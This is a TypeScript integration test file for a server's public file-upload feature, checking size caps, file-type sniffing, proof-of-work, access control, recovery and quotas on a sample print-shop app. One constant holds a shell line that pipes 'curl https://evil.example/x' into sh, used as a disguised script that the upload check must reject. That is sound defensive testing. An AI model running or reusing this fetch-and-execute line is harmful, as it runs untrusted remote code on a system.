// SPDX-License-Identifier: AGPL-3.0-only
/**
 * A GUEST'S FILE INTO AN APP'S FILE COLUMN, through the whole server, on every
 * engine this run can reach, from an app installed by the real installer.
 *
 * A print shop: a client signs in (their logo on their own row), orders with
 * a brief (up to 100 MB) and lines with artwork (up to 10 MB), and a stranger
 * asks for a quote with a sketch. Each file goes up through
 * `POST /public/uploads`, judged by the entry and the column's own rule,
 * proved (or signed in), sniffed; the next write names its id, holds it, and
 * once the row is saved adopts it as the row's own file: staff open it, the
 * guest reads it back through `GET /public/files`, the row's removal bins it,
 * an erasure removes it. A write that does not stand lets it wait again; a
 * write cut off between its commit and its adoption is mended by the
 * recovery pass. Only the column a file was taken for takes it, and only in
 * its day. One address past its day of bytes, and a full pool, are refused;
 * a full forms pool never stops a column. A 100 MB file streams to disk.
 */
import { mkdtemp, rm } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { Readable } from 'node:stream';

import { validateManifest } from '@adminium/manifest';
import { filesRepo, publicUploadsRepo, rolesRepo, settingsRepo, usersRepo } from '@adminium/meta';
import { afterAll, beforeAll, describe, expect, it } from 'vitest';

import { solveProof } from '../src/public-api/proof.js';
import { createPublicViews } from '../src/public-api/runtime.js';
import { createColumnUploads, HOLD_RECOVER_MS } from '../src/public-uploads/columns.js';
import { purgeRowFiles, rowFileIds } from '../src/privacy/erase-meta.js';
import { adminPasswordHash, ADMIN_PASSWORD, sessionCookie } from './auth-helpers.js';
import { createTestFileStore } from './helpers/file-store.js';
import { installInvoicing, invoicingManifest, LEGS, writerFor, type InvoicingHarness } from './invoicing-install.helpers.js';
import { png } from './picture-images.js';
import { servePublic, type Served } from './public-lane.helpers.js';

type Reply = Awaited<ReturnType<Served['get']>>;
type Doc = Record<string, unknown>;

const KB = 1024;
const MB = 1024 * KB;
const id = { ref: 'id', type: 'int', role: 'pk' };
const pdf = (size: number) => Buffer.concat([Buffer.from('%PDF-1.7\n', 'latin1'), Buffer.alloc(Math.max(0, size - 9), 0x20)]);
const TIFF = Buffer.concat([Buffer.from([0x49, 0x49, 0x2a, 0x00]), Buffer.alloc(120, 3)]);
const SCRIPT = Buffer.from('#!/bin/sh\ncurl https://evil.example/x | sh\n', 'latin1');

const fileColumn = (ref: string, accept: string[], kinds: string[], maxBytes: number) => ({
  ref,
  type: 'text',
  maxLength: 64,
  nullable: true,
  rules: { file: { accept, maxBytes, upload: { kinds, maxBytes } } },
});

function printShop(): Doc {
  return {
    ...invoicingManifest([
      { ref: 'clients', columns: [id, { ref: 'email', type: 'text', maxLength: 254, unique: true }, { ref: 'name', type: 'text', maxLength: 120 }, fileColumn('logo', ['png', 'jpeg', 'pdf'], ['png', 'jpg', 'pdf'], 10 * MB)] },
      {
        ref: 'orders',
        columns: [id, { ref: 'client_id', type: 'fk', references: 'clients' }, { ref: 'note', type: 'text', maxLength: 200, nullable: true }, fileColumn('brief', ['pdf', 'tiff'], ['pdf', 'tiff'], 100 * MB)],
      },
      {
        ref: 'order_lines',
        columns: [id, { ref: 'order_id', type: 'fk', references: 'orders' }, { ref: 'label', type: 'text', maxLength: 80, nullable: true }, fileColumn('artwork', ['pdf', 'jpeg', 'png', 'tiff'], ['pdf', 'jpg', 'png', 'tiff'], 10 * MB)],
      },
      { ref: 'quotes', columns: [id, { ref: 'email', type: 'text', maxLength: 254 }, fileColumn('sketch', ['pdf'], ['pdf'], 10 * MB)] },
    ]),
    compatibility: { minAdminiumVersion: '0.3.43' },
    publicAccess: [
      { table: 'clients', methods: ['GET', 'PATCH'], select: ['name', 'logo'], writable: ['logo'], uploads: ['logo'], files: ['logo'], claim: { match: ['email', 'name'] } },
      {
        table: 'orders',
        methods: ['POST'],
        claimedBy: { table: 'clients', column: 'client_id' },
        writable: ['note', 'brief'],
        uploads: ['brief'],
        select: ['id', 'note', 'brief'],
        children: { order_lines: { via: 'order_id', writable: ['label', 'artwork'], uploads: ['artwork'], select: ['id', 'artwork'], max: 5 } },
      },
      { table: 'orders', methods: ['GET'], claimedBy: { table: 'clients', column: 'client_id' }, select: ['id', 'note', 'brief'], files: ['brief'] },
      { table: 'order_lines', methods: ['GET'], visibleWith: { table: 'orders', via: 'order_id' }, select: ['id', 'label', 'artwork'], files: ['artwork'] },
      { table: 'quotes', methods: ['POST'], writable: ['email', 'sketch'], uploads: ['sketch'], humanCheck: true, select: ['id'] },
    ],
  };
}

describe.each(LEGS)("a guest's file into an app's file column — %s", (dialect, available) => {
  let h: InvoicingHarness & { reply: Record<string, unknown> };
  let served: Served;
  let dataDir: string;
  let cookie: string;
  let ada: string;
  let ben: string;
  let ip = 0;
  const fresh = () => {
    ip += 1;
    return `10.7.${String((ip >> 8) & 255)}.${String(ip & 255)}`;
  };
  const ref = {
    clients: () => `${h.real('clients')}_claimed`,
    orders: () => `${h.real('orders')}_claimed`,
    ordersRead: () => `${h.real('orders')}_claimed_2`,
    lines: () => `${h.real('order_lines')}_claimed`,
    quotes: () => h.real('quotes'),
  };
  const error = (res: Reply) => (res.json() as { error: { code: string; params?: Doc } }).error;
  const proof = async (purpose: 'upload' | 'write', address: string) => {
    const res = await served.composed.app.inject({ method: 'GET', url: `/api/v1/public/challenge?purpose=${purpose}`, remoteAddress: address, headers: served.headers() });
    const c = (res.json() as { data: { id: string; salt: string; difficulty: number } }).data;
    return `${c.id}.${solveProof(c.salt, c.difficulty)}`;
  };
  /** One file sent as a page sends it: the body the file. */
  const send = (at: string, column: string, body: Buffer | Readable, opts: { session?: string; proof?: string; address?: string; name?: string; type?: string } = {}) =>
    served.composed.app.inject({
      method: 'POST',
      url: `/api/v1/public/uploads?${new URLSearchParams({ ref: at, column, name: opts.name ?? 'file.pdf' }).toString()}`,
      remoteAddress: opts.address ?? fresh(),
      headers: served.headers(opts.session, { 'content-type': opts.type ?? 'application/pdf', ...(opts.proof === undefined ? {} : { 'x-adminium-proof': opts.proof }) }),
      payload: body,
    });
  /** A file taken: its upload id. */
  const uploaded = async (...args: Parameters<typeof send>): Promise<string> => {
    const res = await send(...args);
    expect(res.statusCode, res.body).toBe(200);
    return (res.json() as { data: { id: string } }).data.id;
  };
  const order = (session: string, values: Doc, lines: Doc[] = []) => served.post(`/records/${ref.orders()}`, { values, ...(lines.length === 0 ? {} : { children: { order_lines: lines.map((line) => ({ values: line })) } }) }, session);
  const patch = (url: string, payload: Doc, session: string) => served.composed.app.inject({ method: 'PATCH', url: `/api/v1/public${url}`, headers: served.headers(session), payload });
  const fileOf = async (uploadId: string) => (await publicUploadsRepo(h.meta).findById(uploadId))!;
  const rows = (table: string) => h.rows(`select * from ${h.real(table)} order by id`);
  const tableId = async (table: string) => (await writerFor(h)).targetOf(table).table.id;

  beforeAll(async () => {
    if (!available) return;
    dataDir = await mkdtemp(join(tmpdir(), 'column-uploads-'));
    const checked = validateManifest(printShop());
    expect(checked.ok ? [] : checked.issues.map((issue) => `${String(issue.path)}: ${issue.message}`)).toEqual([]);
    h = await installInvoicing(dialect, printShop());
    served = await servePublic(h, (h.reply['publicAccess'] as { keyId: string }).keyId, { ADMINIUM_DATA_DIR: dataDir });
    const desk = await usersRepo(h.meta).create({ email: 'desk@marlow.dev', name: 'Desk', passwordHash: await adminPasswordHash() });
    await rolesRepo(h.meta).assignToUser(desk.id, (await rolesRepo(h.meta).findBySlug('super-admin'))!.id);
    cookie = sessionCookie((await served.composed.app.inject({ method: 'POST', url: '/api/v1/auth/login', payload: { email: 'desk@marlow.dev', password: ADMIN_PASSWORD } })).headers['set-cookie']);
    await h.rows(`insert into ${h.real('clients')} (email, name) values ('ada@example.com', 'Ada')`);
    await h.rows(`insert into ${h.real('clients')} (email, name) values ('ben@example.com', 'Ben')`);
    const claim = async (email: string, name: string) => ((await served.post('/claim', { match: { email, name } })).json() as { data: { session: string } }).data.session;
    ada = await claim('ada@example.com', 'Ada');
    ben = await claim('ben@example.com', 'Ben');
  }, 180_000);

  afterAll(async () => {
    if (!available) return;
    await served.close();
    await h.close();
    await rm(dataDir, { recursive: true, force: true });
  });

  it.skipIf(!available)('refuses a 20 MB file at a 10 MB column cap, by its length and when its length is not said, and keeps nothing', async () => {
    const declared = await send(ref.orders(), 'order_lines.artwork', pdf(20 * MB), { session: ada });
    expect(declared.statusCode).toBe(413);
    expect(error(declared)).toMatchObject({ code: 'PUBLIC_UPLOAD_REFUSED', params: { reason: 'too-big' } });
    // Inside the slack the length allows, past the cap: cut off at the spool.
    const past = await send(ref.orders(), 'order_lines.artwork', pdf(10 * MB + 1), { session: ada });
    expect(past.statusCode).toBe(413);
    expect(error(past).params).toEqual({ reason: 'too-big' });
    expect(await h.meta.db.selectFrom('adminium_files').select('id').where('kind', '=', 'stranger').where('sizeBytes', '>', 10 * MB).execute()).toEqual([]);
    // A column no entry lets a guest upload into: refused before anything is read.
    const note = await send(ref.orders(), 'note', pdf(10), { session: ada });
    expect(note.statusCode).toBe(400);
    expect(error(note).params).toEqual({ reason: 'column' });
    expect((await send(ref.orders(), 'order_lines.label', pdf(10), { session: ada })).statusCode).toBe(400);
  });

  it.skipIf(!available)('refuses a script renamed .jpg, by its bytes', async () => {
    const res = await send(ref.orders(), 'order_lines.artwork', SCRIPT, { session: ada, name: 'poster.jpg', type: 'image/jpeg' });
    expect(res.statusCode).toBe(415);
    expect(error(res)).toMatchObject({ code: 'PUBLIC_UPLOAD_REFUSED', params: { reason: 'kind' } });
  });

  it.skipIf(!available)("asks a stranger one proof a file, spent once, and adopts the sketch into the quote they send", async () => {
    const address = fresh();
    const none = await send(ref.quotes(), 'sketch', pdf(200), { address });
    expect(none.statusCode).toBe(403);
    expect(error(none).code).toBe('PUBLIC_PROOF_REQUIRED');
    const proved = await proof('upload', address);
    const sketch = await uploaded(ref.quotes(), 'sketch', pdf(200), { address, proof: proved });
    // The same proof again: spent.
    expect((await send(ref.quotes(), 'sketch', pdf(200), { address, proof: proved })).statusCode).toBe(403);
    // A write proof is no upload proof.
    expect((await send(ref.quotes(), 'sketch', pdf(200), { address, proof: await proof('write', address) })).statusCode).toBe(403);
    const created = await served.composed.app.inject({
      method: 'POST',
      url: `/api/v1/public/records/${ref.quotes()}`,
      remoteAddress: address,
      headers: served.headers(undefined, { 'x-adminium-proof': await proof('write', address) }),
      payload: { values: { email: 'cat@example.com', sketch } },
    });
    expect(created.statusCode, created.body).toBe(201);
    const fileId = (await fileOf(sketch)).fileId;
    // Adopted: the upload row is closed, the file is the quote's own upload.
    expect(fileId).toBeNull();
    const quote = (await rows('quotes')).at(-1)!;
    const file = (await filesRepo(h.meta).findById(String(quote['sketch'])))!;
    expect(file).toMatchObject({ kind: 'upload', uploadedBy: null, entityTable: await tableId('quotes'), entityId: String(quote['id']) });
    expect(file.attachedAt).not.toBeNull();
  });

  it.skipIf(!available)('takes the artwork of an order line in a create with its lines: staff open it, the guest reads it back, removing the line bins it', async () => {
    const artwork = await uploaded(ref.orders(), 'order_lines.artwork', png({ fill: 40 }).bytes, { session: ada, name: 'poster.png', type: 'image/png' });
    const res = await order(ada, { note: 'Fifty A2 posters' }, [{ label: 'A2 poster', artwork }]);
    expect(res.statusCode, res.body).toBe(201);
    const line = (await rows('order_lines')).at(-1)!;
    const fileId = String(line['artwork']);
    expect(fileId).toMatch(/^file_/);
    expect((res.json() as { children: { order_lines: { data: { artwork: string } }[] } }).children.order_lines[0]!.data.artwork).toBe(fileId);
    expect(await filesRepo(h.meta).findById(fileId)).toMatchObject({ kind: 'upload', uploadedBy: null, entityTable: await tableId('order_lines'), entityId: String(line['id']) });
    // Staff, through the files route.
    const staff = await served.composed.app.inject({ method: 'GET', url: `/api/v1/files/${fileId}/content`, headers: { cookie } });
    expect(staff.statusCode, staff.body).toBe(200);
    expect(staff.rawPayload.equals(png({ fill: 40 }).clean)).toBe(true);
    // The guest, through the line their order holds.
    const own = await served.get(`/files/${ref.lines()}/${String(line['id'])}/artwork`, ada);
    expect(own.statusCode, own.body).toBe(200);
    expect(own.headers['content-type']).toBe('image/png');
    // Not Ben.
    expect((await served.get(`/files/${ref.lines()}/${String(line['id'])}/artwork`, ben)).statusCode).toBe(404);
    // The line removed by staff: its file goes to the bin with it.
    const removed = await served.composed.app.inject({ method: 'DELETE', url: `/api/v1/data/${h.connectionId}/${encodeURIComponent(await tableId('order_lines'))}/${String(line['id'])}`, headers: { cookie } });
    expect(removed.statusCode, removed.body).toBeLessThan(300);
    expect((await filesRepo(h.meta).findById(fileId))?.deletedAt).not.toBeNull();
  });

  it.skipIf(!available)('stores a TIFF and serves it only as a download, to the guest and to staff', async () => {
    const brief = await uploaded(ref.orders(), 'brief', TIFF, { session: ada, name: 'scan.tif', type: 'image/tiff' });
    expect((await fileOf(brief)).kind).toBe('tiff');
    expect((await order(ada, { note: 'From a scan', brief })).statusCode).toBe(201);
    const made = (await rows('orders')).at(-1)!;
    const own = await served.get(`/files/${ref.ordersRead()}/${String(made['id'])}/brief`, ada);
    expect(own.statusCode, own.body).toBe(200);
    expect(own.headers['content-type']).toBe('image/tiff');
    expect(own.headers['content-disposition']).toMatch(/^attachment; filename="scan\.tif"/);
    expect(own.headers['x-content-type-options']).toBe('nosniff');
    const staff = await served.composed.app.inject({ method: 'GET', url: `/api/v1/files/${String(made['brief'])}/content?inline=true`, headers: { cookie } });
    expect(staff.statusCode, staff.body).toBe(200);
    expect(staff.headers['content-disposition']).toMatch(/^attachment/);
  });

  it.skipIf(!available)("never lets another column, another table, a raw file id or an expired upload be named", async () => {
    const artwork = await uploaded(ref.orders(), 'order_lines.artwork', pdf(300), { session: ada });
    const refusedOn = async (res: Reply, column: string) => {
      expect(res.statusCode, res.body).toBe(400);
      expect(error(res)).toMatchObject({ code: 'PUBLIC_WRITE_REFUSED', params: { column, reason: 'file-not-here' } });
    };
    // Another column, by another guest: the order's brief.
    await refusedOn(await order(ben, { brief: artwork }), 'brief');
    // Another table: Ben's own logo.
    await refusedOn(await patch(`/records/${ref.clients()}/2`, { values: { logo: artwork } }, ben), 'logo');
    expect((await fileOf(artwork)).attachedAt).toBeNull();
    // A file id in place of an upload: never a guest's to name, whoever's it is.
    const someone = (await h.meta.db.selectFrom('adminium_files').select('id').where('kind', '=', 'upload').executeTakeFirst())?.id ?? 'file_00000000000000000000000000';
    const named = await order(ada, { note: 'x' }, [{ label: 'x', artwork: someone }]);
    expect(named.statusCode).toBe(400);
    expect(error(named).code).toBe('PUBLIC_WRITE_REFUSED');
    // Past its day: refused in its own column too.
    await h.meta.db.updateTable('adminium_public_uploads').set({ expiresAt: Date.now() - 1 }).where('id', '=', artwork).execute();
    const late = await order(ada, { note: 'late' }, [{ label: 'late', artwork }]);
    expect(late.statusCode).toBe(400);
    expect(error(late).params).toMatchObject({ column: 'artwork', reason: 'file-not-here', child: 'order_lines', index: 0 });
  });

  it.skipIf(!available)('lets a refused write release its holds, so the next write takes the same file', async () => {
    const artwork = await uploaded(ref.orders(), 'order_lines.artwork', pdf(400), { session: ada });
    // The second line names a file no guest may name: the whole order is refused, after the first line's upload was held.
    const someone = (await h.meta.db.selectFrom('adminium_files').select('id').where('kind', '=', 'upload').executeTakeFirst())!.id;
    const refused = await order(ada, { note: 'refused' }, [{ label: 'held', artwork }, { label: 'not theirs', artwork: someone }]);
    expect(refused.statusCode).toBe(400);
    expect(await fileOf(artwork)).toMatchObject({ attachedAt: null, owner: null });
    expect((await fileOf(artwork)).expiresAt).not.toBeNull();
    expect((await order(ada, { note: 'fixed' }, [{ label: 'fixed', artwork }])).statusCode).toBe(201);
    expect((await fileOf(artwork)).removedAt).not.toBeNull();
  });

  it.skipIf(!available)("takes a client's logo on a signed-in change, and an erasure of them removes it", async () => {
    const logo = await uploaded(ref.clients(), 'logo', png({ fill: 90 }).bytes, { session: ada, type: 'image/png', name: 'logo.png' });
    const res = await patch(`/records/${ref.clients()}/1`, { values: { logo } }, ada);
    expect(res.statusCode, res.body).toBe(200);
    const fileId = String((await rows('clients'))[0]!['logo']);
    expect((await served.get(`/files/${ref.clients()}/1/logo`, ada)).statusCode).toBe(200);
    // The person's own rows, as an erasure finds them: the file is among theirs, and goes whole.
    const people = [{ connectionId: h.connectionId, table: await tableId('clients'), tableName: h.real('clients'), key: '1' }];
    expect(await rowFileIds(h.meta, people)).toContain(fileId);
    expect(await purgeRowFiles(h.meta, createTestFileStore({ dataDir, meta: h.meta }), [fileId])).toEqual({ purged: 1, failed: 0 });
    expect(await filesRepo(h.meta).findById(fileId)).toBeNull();
  });

  it.skipIf(!available)('adopts on the recovery pass a file a write held and saved but never adopted, and lets go of one no row names', async () => {
    const columns = createColumnUploads({ meta: h.meta, data: (connectionId) => h.manager.data(connectionId), viewFor: createPublicViews(h.meta).viewFor });
    const table = (await writerFor(h)).targetOf('clients').table;
    const saved = await uploaded(ref.clients(), 'logo', pdf(500), { session: ben });
    const lost = await uploaded(ref.clients(), 'logo', pdf(600), { session: ben });
    // The write held it and committed the row, then stopped before adopting it.
    const values: Doc = { logo: saved };
    const held = await columns.hold(h.connectionId, [{ table, uploads: new Set(['logo']), values, key: '2' }]);
    expect(held.ok).toBe(true);
    await h.rows(`update ${h.real('clients')} set logo = '${String(values['logo'])}' where id = 2`);
    // A write that held a file and never committed.
    expect((await columns.hold(h.connectionId, [{ table, uploads: new Set(['logo']), values: { logo: lost }, key: '2' }])).ok).toBe(true);
    // Too young yet: the write may still be adopting it.
    expect(await columns.recover()).toEqual({ adopted: 0, released: 0 });
    await h.meta.db.updateTable('adminium_public_uploads').set({ attachedAt: Date.now() - HOLD_RECOVER_MS - 1_000 }).where('id', 'in', [saved, lost]).execute();
    expect(await columns.recover()).toEqual({ adopted: 1, released: 1 });
    expect((await fileOf(saved)).removedAt).not.toBeNull();
    expect(await fileOf(lost)).toMatchObject({ attachedAt: null, owner: null });
    const own = await served.get(`/files/${ref.clients()}/2/logo`, ben);
    expect(own.statusCode, own.body).toBe(200);
    expect(own.rawPayload.equals(pdf(500))).toBe(true);
  });

  it.skipIf(!available)("refuses one address at its day of bytes, and never stops a column for a full forms pool", async () => {
    const settings = settingsRepo(h.meta);
    try {
      await settings.set('publicUploads.perAddressDailyBytes', 1 * MB, { updatedBy: null });
      const address = fresh();
      await uploaded(ref.orders(), 'brief', pdf(600 * KB), { session: ada, address });
      const capped = await send(ref.orders(), 'brief', pdf(600 * KB), { session: ada, address });
      expect(capped.statusCode).toBe(429);
      expect(error(capped).params).toEqual({ reason: 'cap' });
      await settings.set('publicUploads.perAddressDailyBytes', 524_288_000, { updatedBy: null });

      // The forms pool full, the columns pool not.
      await settings.set('publicUploads.quotaBytes', 2 * MB, { updatedBy: null });
      const file = await filesRepo(h.meta).create({ filename: 'form.pdf', mime: 'application/pdf', sizeBytes: 2 * MB, sha256: 'f'.repeat(64), kind: 'stranger', uploadedBy: null });
      await publicUploadsRepo(h.meta).create({ id: 'fu'.padEnd(32, '0'), binding: { kind: 'form', key: 'forms/frm_full', addressKey: 'c'.repeat(64) }, name: 'form.pdf', size: 2 * MB, kind: 'pdf', fileId: file.id, expiresAt: Date.now() + 3_600_000 });
      await uploaded(ref.orders(), 'brief', pdf(300 * KB), { session: ada });
      // Its own pool full (the 600 KB brief above still waits beside these): refused, as a quota.
      const full = await send(ref.orders(), 'brief', pdf(200 * KB), { session: ada });
      expect(full.statusCode).toBe(507);
      expect(error(full).params).toEqual({ reason: 'quota' });
    } finally {
      await settings.set('publicUploads.quotaBytes', 2_147_483_648, { updatedBy: null });
      await settings.set('publicUploads.perAddressDailyBytes', 524_288_000, { updatedBy: null });
    }
  });

  it.skipIf(!available)('streams a 100 MB brief to disk without holding the body in memory', async () => {
    const chunk = Buffer.alloc(MB, 0x20);
    let first = true;
    const body = Readable.from(
      (function* () {
        for (let sent = 0; sent < 100 * MB; sent += MB) {
          if (first) {
            first = false;
            yield Buffer.concat([Buffer.from('%PDF-1.7\n', 'latin1'), chunk.subarray(9)]);
          } else yield chunk;
        }
      })(),
    );
    const base = process.memoryUsage();
    let peak = 0;
    const watch = setInterval(() => {
      const now = process.memoryUsage();
      peak = Math.max(peak, now.arrayBuffers - base.arrayBuffers);
    }, 5);
    let res: Reply;
    try {
      res = await send(ref.orders(), 'brief', body, { session: ada, name: 'brief.pdf' });
    } finally {
      clearInterval(watch);
    }
    expect(res.statusCode, res.body).toBe(200);
    expect((res.json() as { data: { size: number } }).data.size).toBe(100 * MB);
    // Spooled to disk in chunks: the whole body was never one buffer.
    expect(peak).toBeLessThan(60 * MB);
  });
});
